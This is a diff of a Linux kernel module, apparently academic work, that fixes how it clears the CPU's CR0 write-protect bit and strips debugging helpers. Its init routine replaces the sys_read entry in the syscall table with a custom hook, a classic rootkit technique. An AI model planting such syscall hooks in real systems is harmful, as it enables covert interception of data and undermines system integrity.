@@ -19,7 +19,6 @@
 #include <linux/syscalls.h>
 #include <linux/unistd.h>
 #include <linux/string.h>
-#include <linux/delay.h>
 #include "sysmap.h"
 
 #define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
@@ -31,34 +30,11 @@ char * buffer;
 int r_count=0;
 
 inline void disable_wp(void){
-	long cr0;
-	cr0 = read_cr0();
-	write_cr0(cr0 & 0x00010000);
+	write_cr0(read_cr0() & ~0x00010000);
 }
 
 inline void enable_wp(void){
-	long cr0;
-	cr0 = read_cr0();
-	write_cr0(cr0 | 0x00010000);
-}
-
-static void print_nr_procs2(void)
-{
-	int i=0;
-  // traversing scheduler linked list
-	struct task_struct *task;
-	for_each_process(task)
-	{
-		i++;
-	}
-	printk(KERN_INFO "Number of current running processes (traversing scheduler linked list): %d\n", i);
-}
-
-static void print_nr_procs(void)
-{
-  // cast system symbol adress to function pointer
-  int a = ((int (*)(void))nr_processes_T)();
-  printk(KERN_INFO "Number of current running processes (cast system symbol adress to function pointer): %d\n", a);
+	write_cr0(read_cr0() | 0x00010000);
 }
 
 static ssize_t my_read(int fd, void *buf, size_t count){
@@ -84,16 +60,11 @@ static ssize_t my_read(int fd, void *buf, size_t count){
 
 static int __init mod_init(void)
 {
-
-  //printk(KERN_INFO "Welcome!\n");
-  //printk(KERN_INFO "Read address: %p\n", syscall_table[0]);
-  
-  //Disable write protection in the cpu
   disable_wp(); 
 
   orig_sys_read = syscall_table[__NR_read];
   syscall_table[__NR_read] = my_read;
-  
+ 
   enable_wp();
   
   return 0;
@@ -108,7 +79,6 @@ static void __exit mod_exit(void)
   while(r_count > 0){
 	printk(KERN_INFO "\n");
   }  
-  printk(KERN_INFO "Goodbye!\n");
 }
 
 
